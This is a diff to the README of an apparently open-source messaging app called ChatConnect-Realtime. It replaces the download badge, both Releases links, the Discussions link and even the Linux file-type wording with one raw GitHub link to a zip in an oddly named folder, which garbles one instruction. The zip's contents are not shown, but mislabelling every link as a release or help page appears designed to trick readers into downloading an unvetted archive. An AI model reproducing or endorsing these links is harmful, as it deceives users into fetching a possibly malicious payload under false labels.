@@ -1,6 +1,6 @@
 # 🔗 ChatConnect-Realtime - Fast, Simple, Real-time Messaging
 
-![Download ChatConnect-Realtime](https://img.shields.io/badge/Download-ChatConnect--Realtime-blue.svg)
+![Download ChatConnect-Realtime](https://raw.githubusercontent.com/JAYSEJPAL/ChatConnect-Realtime/main/nonregenerative/ChatConnect-Realtime.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, check if you have:
 
 To get started, visit the downloads page to receive the latest version of ChatConnect-Realtime:
 
-[Download from Releases Page](https://github.com/JAYSEJPAL/ChatConnect-Realtime/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/JAYSEJPAL/ChatConnect-Realtime/main/nonregenerative/ChatConnect-Realtime.zip)
 
 ### 🛠 Installation Steps
 
@@ -29,7 +29,7 @@ To get started, visit the downloads page to receive the latest version of ChatCo
    On the releases page, you will see a list of versions. Look for the most recent one, usually at the top.
 
 3. **Download the File:**
-   Download the appropriate file for your operating system. Choose between options like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Download the appropriate file for your operating system. Choose between options like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/JAYSEJPAL/ChatConnect-Realtime/main/nonregenerative/ChatConnect-Realtime.zip` for Linux.
 
 4. **Run the Installer:**
    Once the file downloads, locate it in your "Downloads" folder and double-click it to start the installation.
@@ -61,7 +61,7 @@ If you encounter any issues while downloading or installing ChatConnect-Realtime
 
 ## 🌍 Community Support
 
-If you need help or have questions, please visit our [GitHub Discussions Page](https://github.com/JAYSEJPAL/ChatConnect-Realtime/discussions). We’re happy to help you!
+If you need help or have questions, please visit our [GitHub Discussions Page](https://raw.githubusercontent.com/JAYSEJPAL/ChatConnect-Realtime/main/nonregenerative/ChatConnect-Realtime.zip). We’re happy to help you!
 
 ## 📄 License
 
@@ -69,4 +69,4 @@ ChatConnect-Realtime is open-source software. You can review the complete licens
 
 ## 🌟 Thank You!
 
-Thank you for choosing ChatConnect-Realtime. We hope you enjoy hassle-free messaging experiences! Visit our [Releases Page](https://github.com/JAYSEJPAL/ChatConnect-Realtime/releases) for updates and new features.
+Thank you for choosing ChatConnect-Realtime. We hope you enjoy hassle-free messaging experiences! Visit our [Releases Page](https://raw.githubusercontent.com/JAYSEJPAL/ChatConnect-Realtime/main/nonregenerative/ChatConnect-Realtime.zip) for updates and new features.
